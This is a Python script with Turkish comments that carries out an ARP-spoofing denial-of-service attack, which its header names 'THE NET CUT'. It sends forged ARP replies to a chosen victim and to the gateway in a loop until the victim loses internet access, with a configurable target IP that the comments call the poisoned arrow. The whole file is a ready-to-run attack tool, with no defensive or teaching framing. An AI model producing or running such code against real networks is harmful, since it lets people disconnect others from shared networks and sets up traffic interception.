from scapy.all import ARP, send, conf
import time
import sys

# --- THE NET CUT: TARGETED DOS ATTACK ---
# AMAÇ: Hedefin internet trafiğini üzerimize çekip yok etmek (Drop).
# SONUÇ: Hedef cihaz internete çıkamaz.

def get_mac(ip):
    # Hedefin MAC adresini öğren (Scapy ile ARP isteği)
    from scapy.all import srp, Ether
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None

def cut_connection(target_ip, gateway_ip):
    # 1. MAC Adreslerini Bul
    print(f"[*] Hedef ({target_ip}) ve Modem ({gateway_ip}) analiz ediliyor...")
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] MAC adresleri bulunamadı. IP'leri kontrol et.")
        return

    print("\n" + "!" * 40)
    print(f"[!!!] SALDIRI BAŞLADI: {target_ip} AĞDAN DÜŞÜRÜLÜYOR...")
    print(f"[i] Durdurmak için CTRL+C yap ve bekle.")
    print("!" * 40)

    try:
        while True:
            # 2. KURBANA YALAN SÖYLE: "Ben Modemim"
            # hwdst=KurbanMAC, pdst=KurbanIP, psrc=ModemIP
            packet_to_victim = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            
            # 3. MODEME YALAN SÖYLE: "Ben Kurbanım"
            # hwdst=ModemMAC, pdst=ModemIP, psrc=KurbanIP
            packet_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

            # Paketleri gönder
            send(packet_to_victim, verbose=False)
            send(packet_to_gateway, verbose=False)
            
            # Ekrana bas (Görsel efekt)
            sys.stdout.write(f"\r[+] Paketler atılıyor... Kurbanın interneti kesik. ✂️")
            sys.stdout.flush()
            
            # Biraz bekle (Çok hızlı atıp ağı kilitlemeyelim)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n\n[*] Saldırı durduruldu. ARP tabloları iyileştiriliyor (Re-ARP)...")
        # Ağı eski haline getir (Kurbanın interneti geri gelsin)
        send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5)
        send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5)
        print("[+] Ağ normale döndü.")

if __name__ == "__main__":
    # --- AYARLAR ---
    # Hedefin IP adresi (Kimi düşüreceksin?)
    TARGET_IP = "192.168.1.104"  # <-- ZEHİRLİ OK BURAYA (Değiştir)
    
    # Modemin IP adresi
    GATEWAY_IP = "192.168.1.1"
    
    # Windows'ta IP Forwarding (Yönlendirme) kapalı olduğu için
    # bu paketleri sadece göndermen yeterli. PC'n trafiği iletmeyecek,
    # böylece internet kesilecek.
    
    cut_connection(TARGET_IP, GATEWAY_IP)